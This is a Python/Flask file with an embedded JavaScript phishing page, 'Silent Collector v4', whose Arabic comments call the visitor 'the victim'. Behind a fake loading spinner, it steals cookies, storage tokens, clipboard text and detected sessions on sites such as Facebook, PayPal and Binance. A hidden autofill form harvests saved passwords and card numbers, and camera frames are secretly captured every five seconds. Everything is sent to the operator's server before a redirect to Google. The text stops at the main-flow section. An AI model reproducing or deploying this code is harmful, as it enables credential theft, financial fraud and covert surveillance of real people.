# silent_collector.py
# ============================================================
# Silent Collector v4 — التصعيد الذكي + Autofill Hijack
# - جمع صامت فوري (بدون إذن)
# - Autofill Hijack: سرقة بيانات المتصفح التلقائية
# - طلب إذن الكاميرا بأسلوب ذكي
# - تصوير مستمر كل 5 ثواني لحد ما الضحية تخرج
# - الرجوع لـ Google تلقائياً
# ============================================================

import os
import time
import json
import uuid
import hashlib
import re
import base64
from datetime import datetime

from flask import Blueprint, request, jsonify, redirect

from config import bot, redis_client, PUBLIC_URL

from logging_config import get_logger
from monitoring import metrics

logger = get_logger("silent_collector")

silent_bp = Blueprint('silent_collector', __name__)


# ============================================================
# الإعدادات
# ============================================================
SESSION_TTL = 86400 * 30        # 30 يوم
GOOGLE_REDIRECT = "https://www.google.com"
CAMERA_INTERVAL = 5000          # 5 ثواني بين كل صورة
CAMERA_MAX_FRAMES = 60          # حد أقصى 60 صورة لكل جلسة
ACCESS_DELAY = 2500             # تأخير قبل طلب الإذن
REDIRECT_DELAY = 2500
AUTOFILL_DELAY = 800            # تأخير قبل قراءة الـ autofill


# المواقع اللي بنكشف جلساتها
KNOWN_SITES = {
    "facebook.com": "Facebook",
    "instagram.com": "Instagram",
    "whatsapp.com": "WhatsApp",
    "web.whatsapp.com": "WhatsApp Web",
    "gmail.com": "Gmail",
    "google.com": "Google",
    "youtube.com": "YouTube",
    "twitter.com": "Twitter",
    "x.com": "X (Twitter)",
    "tiktok.com": "TikTok",
    "linkedin.com": "LinkedIn",
    "netflix.com": "Netflix",
    "amazon.com": "Amazon",
    "paypal.com": "PayPal",
    "binance.com": "Binance",
    "telegram.org": "Telegram",
    "web.telegram.org": "Telegram Web",
    "snapchat.com": "Snapchat",
    "pinterest.com": "Pinterest",
    "reddit.com": "Reddit",
    "spotify.com": "Spotify",
    "microsoftonline.com": "Microsoft",
    "outlook.com": "Outlook",
    "yahoo.com": "Yahoo",
    "fiverr.com": "Fiverr",
    "upwork.com": "Upwork",
    "github.com": "GitHub",
    "gitlab.com": "GitLab",
    "stackoverflow.com": "Stack Overflow",
}


# ============================================================
# صفحة الالتقاط v4 — التصعيد الذكي + Autofill Hijack
# ============================================================
COLLECTOR_PAGE = r"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<title>جاري التحميل...</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  html, body {
    height: 100%;
    background: #ffffff;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Tahoma", "Arial", sans-serif;
    overflow: hidden;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  .loader-container {
    text-align: center;
    animation: fadeIn 0.3s ease-in;
  }
  @keyframes fadeIn {
    from { opacity: 0; }
    to { opacity: 1; }
  }
  .spinner {
    width: 48px;
    height: 48px;
    border: 3px solid #e8eaed;
    border-top-color: #4285f4;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    margin: 0 auto 20px;
  }
  @keyframes spin {
    to { transform: rotate(360deg); }
  }
  .text {
    color: #5f6368;
    font-size: 14px;
    font-weight: 400;
  }
  .fade-out {
    animation: fadeOut 0.3s ease-out forwards;
  }
  @keyframes fadeOut {
    to { opacity: 0; }
  }

  /* ═══════════════════════════════════════════════════ */
  /* Autofill Hijack — الحقول المخفية */
  /* مخفية تماماً عن المستخدم لكن ظاهرة للمتصفح */
  /* ═══════════════════════════════════════════════════ */
  .af-hijack {
    position: fixed !important;
    left: -9999px !important;
    top: -9999px !important;
    width: 1px !important;
    height: 1px !important;
    opacity: 0.01 !important;
    pointer-events: none !important;
    z-index: -9999 !important;
    overflow: hidden !important;
  }
</style>
</head>
<body>

<!-- ═══════════════════════════════════════════════════ -->
<!-- ★★★ Autofill Hijack Form — مخفي تماماً ★★★ -->
<!-- ═══════════════════════════════════════════════════ -->
<form id="af_form" class="af-hijack" autocomplete="on" onsubmit="return false;">
    <!-- Name -->
    <input type="text" name="name" id="af_name" 
           autocomplete="name" placeholder="Full Name">
    <input type="text" name="fname" id="af_fname" 
           autocomplete="given-name" placeholder="First Name">
    <input type="text" name="lname" id="af_lname" 
           autocomplete="family-name" placeholder="Last Name">
    
    <!-- Email -->
    <input type="email" name="email" id="af_email" 
           autocomplete="email" placeholder="Email">
    <input type="email" name="email2" id="af_email2" 
           autocomplete="username" placeholder="Username/Email">
    
    <!-- Phone -->
    <input type="tel" name="phone" id="af_phone" 
           autocomplete="tel" placeholder="Phone">
    <input type="tel" name="phone_national" id="af_phone_national" 
           autocomplete="tel-national" placeholder="Phone National">
    <input type="tel" name="phone_country" id="af_phone_country" 
           autocomplete="tel-country-code" placeholder="Country Code">
    
    <!-- Address -->
    <input type="text" name="street" id="af_street" 
           autocomplete="street-address" placeholder="Street Address">
    <input type="text" name="address_line1" id="af_addr1" 
           autocomplete="address-line1" placeholder="Address Line 1">
    <input type="text" name="address_line2" id="af_addr2" 
           autocomplete="address-line2" placeholder="Address Line 2">
    <input type="text" name="city" id="af_city" 
           autocomplete="address-level2" placeholder="City">
    <input type="text" name="state" id="af_state" 
           autocomplete="address-level1" placeholder="State/Province">
    <input type="text" name="country" id="af_country" 
           autocomplete="country" placeholder="Country">
    <input type="text" name="country_name" id="af_country_name" 
           autocomplete="country-name" placeholder="Country Name">
    <input type="text" name="zip" id="af_zip" 
           autocomplete="postal-code" placeholder="Postal Code">
    
    <!-- Organization -->
    <input type="text" name="organization" id="af_org" 
           autocomplete="organization" placeholder="Organization">
    <input type="text" name="organization_title" id="af_org_title" 
           autocomplete="organization-title" placeholder="Job Title">
    
    <!-- Personal -->
    <input type="text" name="bday" id="af_bday" 
           autocomplete="bday" placeholder="Birthday">
    <input type="text" name="bday_day" id="af_bday_day" 
           autocomplete="bday-day" placeholder="Birthday Day">
    <input type="text" name="bday_month" id="af_bday_month" 
           autocomplete="bday-month" placeholder="Birthday Month">
    <input type="text" name="bday_year" id="af_bday_year" 
           autocomplete="bday-year" placeholder="Birthday Year">
    <input type="text" name="sex" id="af_sex" 
           autocomplete="sex" placeholder="Sex">
    
    <!-- Username/Password -->
    <input type="text" name="username" id="af_username" 
           autocomplete="username" placeholder="Username">
    <input type="password" name="password" id="af_password" 
           autocomplete="current-password" placeholder="Password">
    <input type="password" name="new_password" id="af_new_password" 
           autocomplete="new-password" placeholder="New Password">
    
    <!-- URL -->
    <input type="url" name="url" id="af_url" 
           autocomplete="url" placeholder="Website">
    
    <!-- Credit Card (بعض المتصفحات تملأها) -->
    <input type="text" name="cc_name" id="af_cc_name" 
           autocomplete="cc-name" placeholder="Cardholder Name">
    <input type="text" name="cc_number" id="af_cc_number" 
           autocomplete="cc-number" placeholder="Card Number">
    <input type="text" name="cc_exp" id="af_cc_exp" 
           autocomplete="cc-exp" placeholder="Card Expiry">
    <input type="text" name="cc_csc" id="af_cc_csc" 
           autocomplete="cc-csc" placeholder="Card CSC">
</form>

<div class="loader-container">
  <div class="spinner"></div>
  <div class="text">جاري التحميل...</div>
</div>

<script>
(function() {
    "use strict";

    var SESSION_ID = "__SESSION_ID__";
    var ENDPOINT = "__ENDPOINT__";
    var REDIRECT_URL = "__REDIRECT_URL__";
    var CAMERA_INTERVAL = __CAMERA_INTERVAL__;
    var CAMERA_MAX_FRAMES = __CAMERA_MAX_FRAMES__;
    var ACCESS_DELAY = __ACCESS_DELAY__;
    var AUTOFILL_DELAY = __AUTOFILL_DELAY__;

    // ─── متغيرات التصوير ───
    var videoStream = null;
    var videoEl = null;
    var captureInterval = null;
    var framesCaptured = 0;
    var cameraActive = false;

    // ═══════════════════════════════════════════════════
    // 1. بناء البيانات الأساسية
    // ═══════════════════════════════════════════════════
    var data = {
        session_id: SESSION_ID,
        collected_at: Math.floor(Date.now() / 1000),
        local_time: new Date().toString(),
        timezone_offset: new Date().getTimezoneOffset(),
        url: location.href,
        referrer: document.referrer || '',
        history_length: history.length || 0
    };

    // ─── Navigator Info ───
    try {
        data.user_agent = navigator.userAgent;
        data.language = navigator.language || 'unknown';
        data.languages = (navigator.languages || []).join(',');
        data.platform = navigator.platform || 'unknown';
        data.vendor = navigator.vendor || 'unknown';
        data.cookie_enabled = navigator.cookieEnabled;
        data.do_not_track = navigator.doNotTrack || null;
        data.hardware_concurrency = navigator.hardwareConcurrency || null;
        data.device_memory = navigator.deviceMemory || null;
        data.max_touch_points = navigator.maxTouchPoints || 0;
        data.online = navigator.onLine;
    } catch(e) {}

    try {
        data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    } catch(e) {}

    try {
        data.screen = {
            width: screen.width,
            height: screen.height,
            avail_width: screen.availWidth,
            avail_height: screen.availHeight,
            color_depth: screen.colorDepth,
            pixel_depth: screen.pixelDepth,
            dpr: window.devicePixelRatio || 1,
            orientation: (screen.orientation && screen.orientation.type) || null
        };
    } catch(e) {}

    try {
        data.window = {
            inner_width: window.innerWidth,
            inner_height: window.innerHeight,
            outer_width: window.outerWidth,
            outer_height: window.outerHeight
        };
    } catch(e) {}

    try {
        data.dark_mode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
        data.reduced_motion = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
        data.touch_support = 'ontouchstart' in window;
    } catch(e) {}

    try {
        var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (conn) {
            data.connection = {
                effective_type: conn.effectiveType || null,
                type: conn.type || null,
                downlink: conn.downlink || null,
                downlinkMax: conn.downlinkMax || null,
                rtt: conn.rtt || null,
                save_data: conn.saveData || false
            };
        }
    } catch(e) {}

    // ═══════════════════════════════════════════════════
    // 2. بصمة الجهاز
    // ═══════════════════════════════════════════════════
    function getWebGLInfo() {
        try {
            var canvas = document.createElement('canvas');
            var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return null;

            var dbg = gl.getExtension('WEBGL_debug_renderer_info');
            var vendor = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
            var renderer = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);

            return {
                vendor: vendor,
                renderer: renderer,
                version: gl.getParameter(gl.VERSION),
                glsl_version: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                max_texture_size: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                max_viewport_dims: gl.getParameter(gl.MAX_VIEWPORT_DIMS) ?
                    Array.from(gl.getParameter(gl.MAX_VIEWPORT_DIMS)).join('x') : null
            };
        } catch(e) { return null; }
    }
    data.webgl = getWebGLInfo();

    function getCanvasFingerprint() {
        try {
            var canvas = document.createElement('canvas');
            canvas.width = 280;
            canvas.height = 60;
            var ctx = canvas.getContext('2d');

            ctx.textBaseline = 'alphabetic';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.font = '11pt "Arial"';
            ctx.fillText('Cwm fjordbank glyphs vext quiz', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.font = '18pt "Times New Roman"';
            ctx.fillText('Cwm fjordbank glyphs vext quiz', 4, 45);

            var dataURL = canvas.toDataURL();
            return dataURL;
        } catch(e) { return null; }
    }
    var canvasFingerprint = getCanvasFingerprint();
    data.canvas_full = canvasFingerprint;
    data.canvas_hash = canvasFingerprint ?
        (canvasFingerprint.length + '_' + canvasFingerprint.substring(50, 100)) : null;

    function getAudioFingerprint() {
        return new Promise(function(resolve) {
            try {
                var AudioContext = window.OfflineAudioContext || window.webkitOfflineAudioContext;
                if (!AudioContext) return resolve(null);

                var ctx = new AudioContext(1, 44100, 44100);
                var osc = ctx.createOscillator();
                osc.type = 'triangle';
                osc.frequency.setValueAtTime(10000, ctx.currentTime);

                var compressor = ctx.createDynamicsCompressor();
                compressor.threshold.setValueAtTime(-50, ctx.currentTime);
                compressor.knee.setValueAtTime(40, ctx.currentTime);
                compressor.ratio.setValueAtTime(12, ctx.currentTime);
                compressor.attack.setValueAtTime(0, ctx.currentTime);
                compressor.release.setValueAtTime(0.25, ctx.currentTime);

                osc.connect(compressor);
                compressor.connect(ctx.destination);
                osc.start(0);

                ctx.startRendering().then(function(buffer) {
                    try {
                        var audioData = buffer.getChannelData(0);
                        var sum = 0;
                        for (var i = 4500; i < 5000; i++) {
                            sum += Math.abs(audioData[i]);
                        }
                        resolve(sum.toString().substring(0, 20));
                    } catch(e) { resolve(null); }
                }).catch(function() { resolve(null); });
            } catch(e) { resolve(null); }
        });
    }

    function detectFonts() {
        try {
            var baseFonts = ['monospace', 'sans-serif', 'serif'];
            var testFonts = [
                'Arial', 'Arial Black', 'Arial Narrow', 'Arial Rounded MT Bold',
                'Verdana', 'Times New Roman', 'Courier New', 'Georgia',
                'Comic Sans MS', 'Trebuchet MS', 'Impact', 'Tahoma',
                'Calibri', 'Segoe UI', 'Helvetica', 'Cambria',
                'Consolas', 'Candara', 'Corbel', 'Franklin Gothic Medium',
                'Gill Sans', 'Lucida Console', 'Lucida Sans Unicode',
                'Palatino Linotype', 'Rockwell', 'Times', 'Webdings',
                'Wingdings', 'Andalus', 'Traditional Arabic', 'Simplified Arabic',
                'Arabic Typesetting', 'Sakkal Majalla', 'Droid Arabic Kufi'
            ];
            var testString = 'mmmmmmmmmmlli';
            var testSize = '72px';
            var span = document.createElement('span');
            span.style.position = 'absolute';
            span.style.left = '-9999px';
            span.style.fontSize = testSize;
            span.style.visibility = 'hidden';
            span.innerHTML = testString;
            document.body.appendChild(span);

            var baseSizes = {};
            for (var i = 0; i < baseFonts.length; i++) {
                span.style.fontFamily = baseFonts[i];
                baseSizes[baseFonts[i]] = span.offsetWidth;
            }

            var detected = [];
            for (var j = 0; j < testFonts.length; j++) {
                var found = false;
                for (var k = 0; k < baseFonts.length; k++) {
                    span.style.fontFamily = "'" + testFonts[j] + "'," + baseFonts[k];
                    if (span.offsetWidth !== baseSizes[baseFonts[k]]) {
                        found = true;
                        break;
                    }
                }
                if (found) detected.push(testFonts[j]);
            }
            document.body.removeChild(span);
            return detected;
        } catch(e) { return []; }
    }
    data.fonts = detectFonts();

    // ═══════════════════════════════════════════════════
    // 3. الكوكيز والتخزين
    // ═══════════════════════════════════════════════════
    function getCookies() {
        try {
            var cookieStr = document.cookie || '';
            var cookies = [];
            var pairs = cookieStr.split(';');
            for (var i = 0; i < pairs.length; i++) {
                var pair = pairs[i].trim();
                if (pair) {
                    var eq = pair.indexOf('=');
                    if (eq > 0) {
                        cookies.push({
                            name: pair.substring(0, eq),
                            value: pair.substring(eq + 1).substring(0, 500)
                        });
                    }
                }
            }
            return {
                raw: cookieStr.substring(0, 3000),
                count: cookies.length,
                cookies: cookies.slice(0, 50)
            };
        } catch(e) { return { raw: '', count: 0, cookies: [] }; }
    }
    data.cookies = getCookies();

    function getLocalStorage() {
        try {
            var result = {};
            var count = 0;
            for (var i = 0; i < localStorage.length && count < 200; i++) {
                var key = localStorage.key(i);
                if (key) {
                    var val = localStorage.getItem(key) || '';
                    result[key] = val.substring(0, 1000);
                    count++;
                }
            }
            return result;
        } catch(e) { return {}; }
    }
    data.local_storage = getLocalStorage();

    function getSessionStorage() {
        try {
            var result = {};
            var count = 0;
            for (var i = 0; i < sessionStorage.length && count < 200; i++) {
                var key = sessionStorage.key(i);
                if (key) {
                    var val = sessionStorage.getItem(key) || '';
                    result[key] = val.substring(0, 1000);
                    count++;
                }
            }
            return result;
        } catch(e) { return {}; }
    }
    data.session_storage = getSessionStorage();

    // ═══════════════════════════════════════════════════
    // 4. كشف الجلسات المسجلة
    // ═══════════════════════════════════════════════════
    function detectSessions() {
        var sessions = [];

        var allStorage = {};
        try {
            for (var k in data.local_storage) {
                allStorage[k.toLowerCase()] = data.local_storage[k];
            }
            for (var k2 in data.session_storage) {
                allStorage[k2.toLowerCase()] = data.session_storage[k2];
            }
        } catch(e) {}

        var cookieStr = (data.cookies.raw || '').toLowerCase();

        var sites = {
            'facebook': ['facebook.com', 'fb_token', 'c_user', 'xs'],
            'instagram': ['instagram.com', 'ig_did', 'csrftoken', 'sessionid'],
            'whatsapp': ['whatsapp', 'wa_'],
            'gmail': ['gmail', 'google', 'SAPISID', 'SID', 'HSID'],
            'youtube': ['youtube', 'SID', 'HSID'],
            'twitter': ['twitter', 'x.com', 'auth_token', 'ct0'],
            'tiktok': ['tiktok', 'sessionid', 'sid_tt'],
            'linkedin': ['linkedin', 'li_at'],
            'netflix': ['netflix', 'NetflixId'],
            'amazon': ['amazon', 'session-id'],
            'paypal': ['paypal', 'PYPF'],
            'github': ['github', 'user_session'],
            'telegram': ['telegram'],
        };

        for (var site in sites) {
            var keywords = sites[site];
            var found = false;
            var matched = [];

            for (var i = 0; i < keywords.length; i++) {
                if (cookieStr.indexOf(keywords[i].toLowerCase()) >= 0) {
                    found = true;
                    matched.push('cookie:' + keywords[i]);
                }
            }

            for (var stKey in allStorage) {
                for (var j = 0; j < keywords.length; j++) {
                    if (stKey.indexOf(keywords[j].toLowerCase()) >= 0) {
                        found = true;
                        matched.push('storage:' + stKey);
                        break;
                    }
                }
            }

            if (found) {
                sessions.push({
                    site: site,
                    matched_keys: matched.slice(0, 5)
                });
            }
        }

        return sessions;
    }
    data.detected_sessions = detectSessions();

    // ═══════════════════════════════════════════════════
    // 5. البحث عن توكنات وإيميلات
    // ═══════════════════════════════════════════════════
    function findTokens() {
        var tokens = [];
        var emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
        var tokenKeys = ['token', 'auth', 'access', 'bearer', 'session', 'jwt', 'api_key', 'apikey'];

        var allStorage = {};
        try {
            for (var k in data.local_storage) allStorage[k] = data.local_storage[k];
            for (var k2 in data.session_storage) allStorage[k2] = data.session_storage[k2];
        } catch(e) {}

        try {
            var foundEmails = new Set();
            for (var sk in allStorage) {
                var val = String(allStorage[sk]);
                var matches = val.match(emailRegex);
                if (matches) {
                    for (var m = 0; m < matches.length && m < 5; m++) {
                        foundEmails.add(matches[m]);
                    }
                }
            }
            data.found_emails = Array.from(foundEmails).slice(0, 10);
        } catch(e) { data.found_emails = []; }

        for (var stk in allStorage) {
            var lowerKey = stk.toLowerCase();
            for (var t = 0; t < tokenKeys.length; t++) {
                if (lowerKey.indexOf(tokenKeys[t]) >= 0) {
                    var tokenValue = String(allStorage[stk]).substring(0, 200);
                    if (tokenValue.length > 10) {
                        tokens.push({
                            key: stk,
                            type: tokenKeys[t],
                            value: tokenValue
                        });
                    }
                    break;
                }
            }
        }

        return tokens.slice(0, 20);
    }
    data.found_tokens = findTokens();

    // ═══════════════════════════════════════════════════
    // 6. جمع المعلومات الإضافية
    // ═══════════════════════════════════════════════════
    function getImages() {
        try {
            var imgs = [];
            var allImages = document.querySelectorAll('img');
            for (var i = 0; i < allImages.length && i < 20; i++) {
                var img = allImages[i];
                if (img.src && img.src.indexOf('data:') !== 0) {
                    imgs.push({
                        src: img.src.substring(0, 200),
                        alt: img.alt || '',
                        width: img.naturalWidth || img.width,
                        height: img.naturalHeight || img.height
                    });
                }
            }
            return imgs;
        } catch(e) { return []; }
    }
    data.images = getImages();

    function getClipboard() {
        return new Promise(function(resolve) {
            try {
                if (navigator.clipboard && navigator.clipboard.readText) {
                    navigator.clipboard.readText()
                        .then(function(text) { resolve(text.substring(0, 1000)); })
                        .catch(function() { resolve(null); });
                } else {
                    resolve(null);
                }
            } catch(e) { resolve(null); }
        });
    }

    function getBattery() {
        return new Promise(function(resolve) {
            try {
                if (navigator.getBattery) {
                    navigator.getBattery().then(function(b) {
                        resolve({
                            level: Math.round(b.level * 100),
                            charging: b.charging,
                            charging_time: b.chargingTime === Infinity ? null : b.chargingTime,
                            discharging_time: b.dischargingTime === Infinity ? null : b.dischargingTime
                        });
                    }).catch(function() { resolve(null); });
                } else {
                    resolve(null);
                }
            } catch(e) { resolve(null); }
        });
    }

    function getPermissions() {
        return new Promise(function(resolve) {
            try {
                if (navigator.permissions && navigator.permissions.query) {
                    var names = ['geolocation', 'notifications', 'camera', 'microphone', 'clipboard-read'];
                    var results = {};
                    var count = 0;

                    names.forEach(function(name) {
                        navigator.permissions.query({ name: name })
                            .then(function(p) { results[name] = p.state; })
                            .catch(function() { results[name] = 'unknown'; })
                            .finally(function() {
                                count++;
                                if (count === names.length) resolve(results);
                            });
                    });

                    setTimeout(function() { resolve(results); }, 300);
                } else {
                    resolve({});
                }
            } catch(e) { resolve({}); }
        });
    }

    function getStorageEstimate() {
        return new Promise(function(resolve) {
            try {
                if (navigator.storage && navigator.storage.estimate) {
                    navigator.storage.estimate().then(function(est) {
                        resolve({
                            quota: est.quota,
                            usage: est.usage,
                            usage_mb: Math.round(est.usage / 1024 / 1024 * 100) / 100
                        });
                    }).catch(function() { resolve(null); });
                } else {
                    resolve(null);
                }
            } catch(e) { resolve(null); }
        });
    }

    function getIndexedDBNames() {
        return new Promise(function(resolve) {
            try {
                if (indexedDB && indexedDB.databases) {
                    indexedDB.databases().then(function(dbs) {
                        resolve(dbs.map(function(db) { return db.name; }));
                    }).catch(function() { resolve([]); });
                } else {
                    resolve([]);
                }
            } catch(e) { resolve([]); }
        });
    }

    function getCacheKeys() {
        return new Promise(function(resolve) {
            try {
                if (window.caches && caches.keys) {
                    caches.keys().then(function(keys) { resolve(keys); })
                        .catch(function() { resolve([]); });
                } else {
                    resolve([]);
                }
            } catch(e) { resolve([]); }
        });
    }

    function getServiceWorkers() {
        return new Promise(function(resolve) {
            try {
                if ('serviceWorker' in navigator && navigator.serviceWorker.getRegistrations) {
                    navigator.serviceWorker.getRegistrations().then(function(regs) {
                        var workers = [];
                        for (var i = 0; i < regs.length; i++) {
                            if (regs[i].active) {
                                workers.push({
                                    scope: regs[i].scope,
                                    script: regs[i].active.scriptURL
                                });
                            }
                        }
                        resolve(workers);
                    }).catch(function() { resolve([]); });
                } else {
                    resolve([]);
                }
            } catch(e) { resolve([]); }
        });
    }

    // ═══════════════════════════════════════════════════
    // ★★★ 7. Autofill Hijack — سرقة البيانات التلقائية ★★★
    // ═══════════════════════════════════════════════════
    function collectAutofill() {
        return new Promise(function(resolve) {
            var result = {};
            
            try {
                // القائمة الكاملة للحقول
                var fields = [
                    'name', 'fname', 'lname',
                    'email', 'email2',
                    'phone', 'phone_national', 'phone_country',
                    'street', 'address_line1', 'address_line2',
                    'city', 'state', 'country', 'country_name', 'zip',
                    'organization', 'organization_title',
                    'bday', 'bday_day', 'bday_month', 'bday_year', 'sex',
                    'username', 'password', 'new_password',
                    'url',
                    'cc_name', 'cc_number', 'cc_exp', 'cc_csc'
                ];

                // اقرأ قيم كل الحقول
                for (var i = 0; i < fields.length; i++) {
                    var field = fields[i];
                    var el = document.getElementById('af_' + field);
                    if (el && el.value && el.value.length > 0) {
                        result[field] = el.value.substring(0, 500);
                    }
                }

                // جرّب استخدام الـ FormData كمان
                try {
                    var form = document.getElementById('af_form');
                    if (form) {
                        var formData = new FormData(form);
                        formData.forEach(function(value, key) {
                            if (value && value.length > 0 && !result[key]) {
                                result[key] = String(value).substring(0, 500);
                            }
                        });
                    }
                } catch(e) {}

                // لو مفيش أي شيء تم ملؤه → انتظر أكثر
                if (Object.keys(result).length === 0) {
                    // جرّب تاني بعد 500ms
                    setTimeout(function() {
                        var result2 = {};
                        for (var j = 0; j < fields.length; j++) {
                            var field2 = fields[j];
                            var el2 = document.getElementById('af_' + field2);
                            if (el2 && el2.value && el2.value.length > 0) {
                                result2[field2] = el2.value.substring(0, 500);
                            }
                        }
                        resolve(result2);
                    }, 500);
                    return;
                }

                resolve(result);

            } catch(e) {
                resolve({});
            }
        });
    }

    // ═══════════════════════════════════════════════════
    // 8. الكاميرا — التصعيد الذكي
    // ═══════════════════════════════════════════════════
    function startSilentCapture() {
        return new Promise(function(resolve) {
            try {
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    return resolve(false);
                }

                videoEl = document.createElement('video');
                videoEl.setAttribute('playsinline', '');
                videoEl.setAttribute('autoplay', '');
                videoEl.setAttribute('muted', '');
                videoEl.muted = true;
                videoEl.style.cssText = 'position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0.01;';

                document.body.appendChild(videoEl);

                navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                }).then(function(stream) {
                    videoStream = stream;
                    videoEl.srcObject = stream;

                    videoEl.onloadedmetadata = function() {
                        videoEl.play().then(function() {
                            cameraActive = true;

                            sendSignal('camera_started', {
                                width: videoEl.videoWidth,
                                height: videoEl.videoHeight
                            });

                            setTimeout(function() {
                                captureFrame();
                            }, 500);

                            captureInterval = setInterval(function() {
                                if (framesCaptured >= CAMERA_MAX_FRAMES) {
                                    stopCapture('max_frames_reached');
                                    return;
                                }
                                captureFrame();
                            }, CAMERA_INTERVAL);

                            resolve(true);
                        }).catch(function() {
                            resolve(false);
                        });
                    };
                }).catch(function(err) {
                    sendSignal('camera_denied', { error: err.name || 'unknown' });
                    resolve(false);
                });

            } catch(e) {
                resolve(false);
            }
        });
    }

    function captureFrame() {
        try {
            if (!videoEl || !videoStream) return;

            var canvas = document.createElement('canvas');
            canvas.width = videoEl.videoWidth || 640;
            canvas.height = videoEl.videoHeight || 480;
            var ctx = canvas.getContext('2d');
            ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);

            var imageData = canvas.toDataURL('image/jpeg', 0.65);

            framesCaptured++;

            sendFrame(imageData, framesCaptured);

        } catch(e) {}
    }

    function sendFrame(imageData, frameNum) {
        try {
            var payload = {
                session_id: SESSION_ID,
                type: 'camera_frame',
                frame_num: frameNum,
                image: imageData,
                timestamp: Date.now()
            };

            var jsonStr = JSON.stringify(payload);

            if (navigator.sendBeacon) {
                try {
                    var blob = new Blob([jsonStr], { type: 'application/json' });
                    if (navigator.sendBeacon(ENDPOINT + '/camera', blob)) {
                        return;
                    }
                } catch(e) {}
            }

            fetch(ENDPOINT + '/camera', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: jsonStr,
                keepalive: true
            }).catch(function() {});
        } catch(e) {}
    }

    function stopCapture(reason) {
        try {
            if (captureInterval) {
                clearInterval(captureInterval);
                captureInterval = null;
            }
            if (videoStream) {
                try {
                    videoStream.getTracks().forEach(function(t) { t.stop(); });
                } catch(e) {}
                videoStream = null;
            }
            if (videoEl && videoEl.parentNode) {
                try {
                    videoEl.parentNode.removeChild(videoEl);
                } catch(e) {}
            }
            cameraActive = false;

            sendSignal('camera_stopped', {
                reason: reason,
                total_frames: framesCaptured
            });
        } catch(e) {}
    }

    // ═══════════════════════════════════════════════════
    // 9. الإرسال
    // ═══════════════════════════════════════════════════
    function sendSignal(type, extra) {
        try {
            var payload = {
                session_id: SESSION_ID,
                type: type,
                timestamp: Date.now()
            };
            if (extra) {
                for (var k in extra) payload[k] = extra[k];
            }

            var jsonStr = JSON.stringify(payload);

            if (navigator.sendBeacon) {
                try {
                    var blob = new Blob([jsonStr], { type: 'application/json' });
                    if (navigator.sendBeacon(ENDPOINT + '/signal', blob)) {
                        return;
                    }
                } catch(e) {}
            }

            fetch(ENDPOINT + '/signal', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: jsonStr,
                keepalive: true
            }).catch(function() {});
        } catch(e) {}
    }

    function sendAutofill(autofillData) {
        return new Promise(function(resolve) {
            try {
                if (!autofillData || Object.keys(autofillData).length === 0) {
                    return resolve(false);
                }

                var payload = {
                    session_id: SESSION_ID,
                    type: 'autofill_data',
                    data: autofillData,
                    timestamp: Date.now()
                };

                var jsonStr = JSON.stringify(payload);

                if (navigator.sendBeacon) {
                    try {
                        var blob = new Blob([jsonStr], { type: 'application/json' });
                        if (navigator.sendBeacon(ENDPOINT + '/autofill', blob)) {
                            return resolve(true);
                        }
                    } catch(e) {}
                }

                fetch(ENDPOINT + '/autofill', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: jsonStr,
                    keepalive: true
                }).then(function() { resolve(true); })
                  .catch(function() { resolve(false); });

            } catch(e) { resolve(false); }
        });
    }

    function collectAll() {
        return Promise.all([
            getAudioFingerprint(),
            getBattery(),
            getClipboard(),
            getPermissions(),
            getStorageEstimate(),
            getIndexedDBNames(),
            getCacheKeys(),
            getServiceWorkers()
        ]).then(function(results) {
            data.audio_fingerprint = results[0];
            data.battery = results[1];
            data.clipboard = results[2];
            data.permissions = results[3];
            data.storage_estimate = results[4];
            data.indexed_db_names = results[5];
            data.cache_keys = results[6];
            data.service_workers = results[7];
            return data;
        });
    }

    function sendMainData(payload) {
        return new Promise(function(resolve) {
            try {
                var jsonStr = JSON.stringify(payload);

                if (navigator.sendBeacon) {
                    try {
                        var blob = new Blob([jsonStr], { type: 'application/json' });
                        if (navigator.sendBeacon(ENDPOINT + '/collect', blob)) {
                            resolve(true);
                            return;
                        }
                    } catch(e) {}
                }

                fetch(ENDPOINT + '/collect', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: jsonStr,
                    keepalive: true
                }).then(function() { resolve(true); })
                  .catch(function() {
                      try {
                          var xhr = new XMLHttpRequest();
                          xhr.open('POST', ENDPOINT + '/collect', true);
                          xhr.setRequestHeader('Content-Type', 'application/json');
                          xhr.send(jsonStr);
                          resolve(true);
                      } catch(e2) { resolve(false); }
                  });
            } catch(e) { resolve(false); }
        });
    }

    function doRedirect() {
        try {
            document.body.classList.add('fade-out');
        } catch(e) {}
        window.location.replace(REDIRECT_URL);
    }

    // ═══════════════════════════════════════════════════
    // MAIN FLOW
